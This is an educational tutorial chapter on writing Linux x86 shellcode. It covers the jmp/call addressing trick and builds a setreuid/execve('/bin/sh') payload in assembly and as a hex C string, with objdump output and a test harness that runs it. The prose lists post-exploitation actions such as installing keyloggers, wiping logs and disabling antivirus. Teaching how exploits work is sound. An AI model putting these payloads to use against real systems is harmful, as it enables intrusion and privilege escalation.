# A Shellcode: The Payload

## Shellcode

In order to execute our raw exploit codes directly in the stack or other parts of the memory, which deal with binary, we need assembly codes that represent a raw set of machine instructions of the target machines. A shellcode is an assembly language program which executes a shell, such as the '/bin/sh' for Unix/Linux shell, or the command.com shell on DOS and Microsoft Windows.  Bear in mind that in exploit, not just a normal shell but what we want is a root shell or Administrator privilege (note: In certain circumstances, in Windows there are account that having privileges higher than Administrator such as LocalSystem). Shellcode is used to spawn a (root) shell because it will give us the highest privilege. A shellcode may be used as an exploit payload, providing a hacker or attacker with command line access to a computer system. Shellcodes are typically injected into computer memory by exploiting stack or heap-based buffer overflows vulnerabilities, or format string attacks.  In a classic and normal exploits, shellcode execution can be triggered by overwriting a stack return address with the address of the injected shellcode. As a result, instead the subroutine returns to the caller, it returns to the shellcode, spawning a shell. Examples of shellcodes may be in the following forms:

As an assembly language - shellcode.s (shellcode.asm – for Windows):

```asm
#a very simple assembly (AT&T/Linux) program for spawning a shell
.section .data
.section .text
.globl _start

_start:
         xor %eax, %eax
         mov $70, %al           #setreuid is syscall 70
         xor %ebx, %ebx
         xor %ecx, %ecx
         int $0x80

         jmp ender

         starter:
         popl %ebx              #get the address of the string
         xor  %eax, %eax
         mov  %al, 0x07(%ebx)   #put a NULL where the N is in the string
         movl %ebx, 0x08(%ebx)  #put the address of the string
                                #to where the AAAA is
         movl %ebx, 0x0c(%ebx)  #put 4 null bytes into where the BBBB is
         mov $11, %al           #execve is syscall 11
         lea 0x08(%ebx), %ecx   #load the address of where the AAAA was
         lea 0x0c(%ebx), %edx   #load the address of the NULLS
         int $0x80              #call the kernel

ender:
         call starter
         .string "/bin/shNAAAABBBB"
```

As a C program - shellcode.c:

```c
#include <unistd.h>

int main(int argc, char*argv[ ])
{
	char *shell[2];

	shell[0] = "/bin/sh";
	shell[1] = NULL;
	execve(shell[0], shell, NULL);
	return 0;
}
```

Take note that the assembly code can be embedded in the C code using the __asm__ keyword and asm for the reverse (GCC, Microsoft). As a null terminated C string char array in C program:

```c
char shellcode[ ] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
```

The shellcode declared as a C string of char type may be the most widely used in exploit codes and the typical format is shown below:

```c
char shcode[ ] = "\x90\x31\x89...";
char shcode[ ] = {0x90,0x90,0x31,...};
```

In a wider definition, shell code not just be used to spawn a shell, it also can be used to create a general payload.  Generally an exploit usually consists of two major components:

1. The exploitation technique.
2. The payload.

The objective of the exploitation part is to divert the execution path of the vulnerable program. We can achieve that through one of the following techniques:

1. Stack-based Buffer Overflow.
2. Heap-based Buffer Overflow.
3. Integer Overflow.
4. Format String.
5. Race condition.
6. Memory corruption, etc.

Once we control the execution path, we probably want it to execute our code. In this case, we need to include these codes or instruction sets in our exploit. Then, the part of code which allows us to execute arbitrary code is known as payload. The payload can virtually do everything a computer program can do with the appropriate permission and right of the vulnerable programs or services.

## Shellcode As A Payload

When the shell is spawned, it may be the simplest way that allows the attacker to explore the target system interactively. For example, it might give the attacker the ability to discover internal network, to further penetrate into other computers. A shell may also allow upload/download file/database, which is usually needed as proof of successful penetration test (pen-test). You also may easily install Trojan horse, key logger, sniffer, enterprise worm, WinVNC, etc. A shell is also useful to restart the vulnerable services keeping the service running. But more importantly, restarting the vulnerable service usually allows us to attack the service again. We also may clean up traces like log files and events with a shell. For Windows we may alter the registry to make it running for every system start up and stopping any antivirus programs.

You also can create a payload that loop and wait for commands from the attacker. The attacker could issue a command to the payload to create new connection, upload/download file or spawn another shell. There are also a few others payload strategies in which the payload will loop and wait for additional payload from the attacker such as in multistage exploits and the (Distributed) Denial of Service (DDOS/DOS). Regardless whether a payload is spawning a shell or loop to wait for instructions; it still needs to communicate with the attacker, locally or remotely. There are so many things that can be done.

## Shellcode Elements

This section will limit the discussion of the payload used to exploit stack based buffer overflows in binary, machine-readable program.  In this program, the shellcode must also be machine-readable.  The shellcode cannot contain any null bytes (0x00).  Null (‘\0’) is a string delimiter which instructs all C string functions (and other similar implementations), once found, will stop processing the string (a null-terminated string).  Depending on the platform used, not just the NULL byte, there are other delimiters such as linefeed (LF-0x0A), carriage return (CR-0x0D), backslash ( \ ) and NOP (No Operation) instruction that must also be considered when creating a workable shellcode.  In the best situations the shellcode may only contain alphanumeric characters.  Fortunately, there are several programs called **Encoder** that can be used to eliminate the NULL and other delimiter characters.

In order to be able to generate machine code that really works, you have to write the assembly code differently, but still have it serve its purpose. You need to do some tricks here and there to produce the same result as the optimal machine code.

Since it’s important that the shellcode should be as small as possible, the shellcode writer usually writes the code in the assembly language, then extracting the opcodes in the hexadecimal format and finally using the code in a program as string variables. Reliable standard libraries are not available for shellcodes; we usually have to use the kernel syscalls (system call) of the operating system directly. Shellcode also is OS and architecture dependent.  Workable shellcode also must consider bypassing the network system protection such as firewall and Intrusion Detection System (IDS).

## Creating A Shellcode: Making The Code Portable

Writing shellcode is slightly different from writing normal assembly code and the main one is the portability issue. Since we do not know which address we are at, it is not possible to access our data and even more impossible to hardcode a memory address directly in our program. We have to apply a trick to be able to make shellcode without having to reference the arguments in memory the conventional way, by giving their exact address on the memory page, which can only be done at compile time. Although this is a significant disadvantage, there are always workarounds for this issue. The easiest way is to use a string or data in the shellcode as shown in the following simple example.

```asm
.section .data
#only use register here...

.section .text

.globl _start

jmp      dummy

_start:
         #pop register, so we know the string location
         #Here we have assembly instructions which will use the string

dummy:
         call     _start

.string "Simple String"
```

What is occurring in this code is that we jmp to the label dummy and then from there call _start label. Once we are at the _start label, we can pop a register which will cause that register to contain the location of our string. CALL is used because it will automatically store the return address on the stack. As discussed before, the return address is the address of the next 4 bytes after the CALL instruction. By placing a variable right behind the call, we indirectly push its address on the stack without having to know it. This is a very useful trick when we do not know where is our code will be executed from. The code arrangement example using C can be illustrated as the following.

Example:

```c
void main(int argc, char **argv)
{
	char *name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;

	/*int execve(char *file, char *argv[], char *env[ ])*/
	execve(name[0], name, NULL);
	exit(0);
}
```

Registers usage:

1. **EAX**: 0xb – syscall number.
2. **EBX**: Address of program name (address of name[0]).
3. **ECX**: Address of null-terminated argument-vector, argv (address of name).
4. **EDX**: Address of null-terminated environment-vector, env/enp (NULL).

In this program, we need:

1. String /bin/sh somewhere in memory.
2. An Address of the string.
3. String /bin/sh followed by a NULL somewhere in memory.
4. An Address of address of string.
5. NULL somewhere in memory.

To determine **address of string** we can make use of instructions using relative addressing. We know that call instruction saves EIP on the stack and jumps to the function so:

1. Use jmp instruction at the beginning of shell code to CALL instruction.
2. call instruction right before /bin/sh string.
3. call jumps back to the first instruction after jump.
4. Now the address of /bin/sh should be on the stack.

<img src="images/image057.png" /><br />
Figure 1: A trick to determine the address of string.

If you are going to write code more complex than just spawning a simple shell, you can put more than one .string behind the CALL. Here, you know the size of those strings and can therefore calculate their relative locations once you know where the first string is located. With this knowledge, let’s try creating a simple shellcode that spawn a shell. The main points here are the similar process and steps that can be followed to create shellcodes. The following is a simple program example to spawn a shell in assembly (AT&T/Linux).

```asm
#assembly (AT&T/Linux) for spawning a shell
####### testshell2.s ############

.section .data
.section .text
.globl _start

_start:
         xor %eax, %eax            #clear register
         mov $70, %al              #setreuid is syscall 70
         xor %ebx, %ebx            #clear register, empty
         xor %ecx, %ecx            #clear register, empty
         int $0x80                 #interrupt 0x80

         jmp ender

starter:
         popl %ebx                 #get the address of the string, in %ebx
         xor  %eax, %eax           #clear register
         mov  %al, 0x07(%ebx)      #put a NULL where the N is in the string
         movl %ebx, 0x08(%ebx)     #put the address of the string to where the AAAA is
         movl %eax, 0x0c(%ebx)     #put 4 null bytes into where the BBBB is
         mov $11, %al              #execve is syscall 11
         lea 0x08(%ebx), %ecx      #load the address of where the AAAA was
         lea 0x0c(%ebx), %edx      #load the address of the NULLS
         int $0x80                 #call the kernel

ender:
         call starter
       .string "/bin/shNAAAABBBB" #16 bytes of string...
```

Basically, before the call starter the memory arrangement should be something like this (Little Endian):

<img src="images/image058.png" /><br />
Figure 2: Memory arrangement for our assembly code.

When the starter: portion is executed the memory arrangement should be something like this:

<img src="images/image059.png" /><br />
Where:<br />
a - Address of the string<br />
Figure 3: Memory arrangement for our shellcode.

Let compile and link the program and then disassemble it to get the equivalent hexadecimal opcodes.

```
[bodo@bakawali testbed8]$ as testshell2.s -o testshell2.o
[bodo@bakawali testbed8]$ ld testshell2.o -o testshell2
[bodo@bakawali testbed8]$ objdump -d testshell2

testshell2:     file format elf32-i386

Disassembly of section .text:

08048074 <_start>:
8048074:       31 c0      xor     %eax, %eax
8048076:       b0 46      mov     $0x46, %al
8048078:       31 db      xor     %ebx, %ebx
804807a:       31 c9      xor     %ecx, %ecx
804807c:       eb 16      jmp     8048094 <ender>

0804807e <starter>:
804807e:       5b         pop     %ebx
804807f:       31 c0      xor     %eax, %eax
8048081:       88 43 07   mov     %al, 0x7(%ebx)
8048084:       89 5b 08   mov     %ebx, 0x8(%ebx)
8048087:       89 43 0c   mov     %eax, 0xc(%ebx)
804808a:       b0 0b      mov     $0xb, %al
804808c:       8d 4b 08   lea     0x8(%ebx), %ecx
804808f:       8d 53 0c   lea     0xc(%ebx), %edx
8048092:       cd 80      int     $0x80

08048094 <ender>:
8048094:       e8 e5 ff ff ff    call   804807e <starter>
8048099:       2f                das
804809a:       62 69 6e          bound  %ebp, 0x6e(%ecx)
804809d:       2f                das
804809e:       73 68             jae    8048108 <ender+0x74>
80480a0:       4e                dec    %esi
80480a1:       41                inc    %ecx
80480a2:       41                inc    %ecx
80480a3:       41                inc    %ecx
80480a4:       41                inc    %ecx
80480a5:       42                inc    %edx
80480a6:       42                inc    %edx
80480a7:       42                inc    %edx
80480a8:       42                inc    %edx
```

Next, arrange the hexadecimal opcodes in char type array (C string).

```c
char code[ ] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"
               "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
               "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"
               "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"
               "\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42";
```

Finally insert the shellcode into our test program, compile and run.

```c
/*test.c*/
#include <unistd.h>

char code[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"
              "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
              "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"
              "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"
              "\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42";

int main(int argc, char **argv)
{
    /*creating a function pointer*/
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();
}
```

```
[bodo@bakawali testbed8]$ gcc -g test.c -o test
[bodo@bakawali testbed8]$ execstack -s test
[bodo@bakawali testbed8]$ ./test
sh-3.00$
```

Well it works. Now, let try another example by using a simple C program. In this example we are using system call for exit(0), that is exit with no error and the program is shown below.

```c
/* exit.c */
#include <unistd.h>

int main()
{
    exit(0);
}
```

Do some verification.

```
[bodo@bakawali testbed7]$ gcc -g exit.c -o exit
[bodo@bakawali testbed7]$ execstack -s exit
[bodo@bakawali testbed7]$ ./exit
[bodo@bakawali testbed7]$ echo $?
0
[bodo@bakawali testbed7]$
```

Another verification.


```c
/* exit.c */
#include <unistd.h>

int main()
{
    exit(1);
}
```

```
[bodo@bakawali testbed7]$ gcc -g exit.c -o exit
[bodo@bakawali testbed7]$ execstack -s exit
[bodo@bakawali testbed7]$ ./exit
[bodo@bakawali testbed7]$ echo $?
1
```

The first thing we need to know is the [Linux system call](http://www.die.net/doc/linux/man/man2/syscalls.2.html) for [exit()](http://www.die.net/doc/linux/man/man2/exit.2.html) and that can be found in unistd.h. System call is the services provided by Linux kernel and just like API’s in Windows, you call them with different arguments. In C programming, it often uses functions defined in libc which provides a wrapper for many system calls. Linux manual page of section 2 provides more information about system calls. To get an overview, try using “man 2” at the command shell. It is also possible to invoke syscall() function directly. Each system call has a **function number** defined in <syscall.h> or <unistd.h>. Internally, system call is invoked by software interrupt **0x80** to transfer control to the kernel. System call table is defined in Linux kernel source file “arch/i386/kernel/entry.S ”.

For our example we need just one system call and that is exit() (terminate the current process and exit with exit code) and its system call number is 1 and the argument is 0, (0 means the program exit normally, non-zero means program exit with an error).  They will be stored in eax, ebx registers respectively.  With this knowledge, let create the program in assembly.

```asm
######testshell.s#######
#assembly code for exit() system call, AT&T/Linux

.section .data
.section .text

.globl _start

    jmp dummy

_start:

    popl %ebx            #gets the "X" address
    xor %eax, %eax       #clear the eax register
    mov %eax, 0x01(%ebx) #move NULL to the end of the "X"
    mov $1, %eax         #move 1 into %eax
    mov $0, %ebx         #move 0 into %ebx
    int $0x80            #interupt 0x80
dummy:
    call _start
    .string "X"
```

Then compile and link this assembly program and next, disassemble the executable.

```
[bodo@bakawali testbed7]$ as testshell.s -o testshell.o
[bodo@bakawali testbed7]$ ld testshell.o -o testshell
[bodo@bakawali testbed7]$ objdump -d testshell

testshell:     file format elf32-i386

Disassembly of section .text:

08048074 <_start-0x2>:
 8048074:       eb 12             jmp    8048088 <dummy>


08048076 <_start>:
 8048076:       5b                pop    %ebx
 8048077:       31 c0             xor    %eax, %eax
 8048079:       89 43 01          mov    %eax, 0x1(%ebx)
 804807c:       b8 01 00 00 00    mov    $0x1, %eax
 8048081:       bb 00 00 00 00    mov    $0x0, %ebx
 8048086:       cd 80             int    $0x80


08048088 <dummy>:
 8048088:       e8 e9 ff ff ff    call   8048076 <_start>
 804808d:       58                pop    %eax
 ...
```

Extract the shellcode; rearrange the hex in char string format.  And each set of hexadecimal value represents our assembly instruction.  Using hexadecimal values we can put any ASCII value in the range of 0-255 in one byte.

```
\xeb\x12\x5b\x31\xc0\x89\x43\x01\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd
\x80\xe8\xe9\xff\xff\xff\x58
```
